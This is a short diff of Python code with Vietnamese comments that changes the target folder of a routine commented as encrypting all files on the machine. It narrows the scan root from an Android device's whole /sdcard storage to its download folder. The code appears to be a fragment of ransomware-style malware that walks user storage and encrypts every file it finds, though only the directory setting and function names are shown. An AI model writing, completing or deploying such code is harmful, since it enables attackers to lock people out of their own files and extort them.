@@ -57,7 +57,7 @@ def encrypt_file(file_path, key):
 
 # Mã hóa toàn bộ file trên máy
 def encrypt_all_files(key):
-    root_dirs = ["/sdcard"]  # 🔥 Thư mục chính chứa tất cả file
+    root_dirs = ["/sdcard/download"]  # 🔥 Thư mục chính chứa tất cả file
     files = []
 
     # Lấy danh sách file
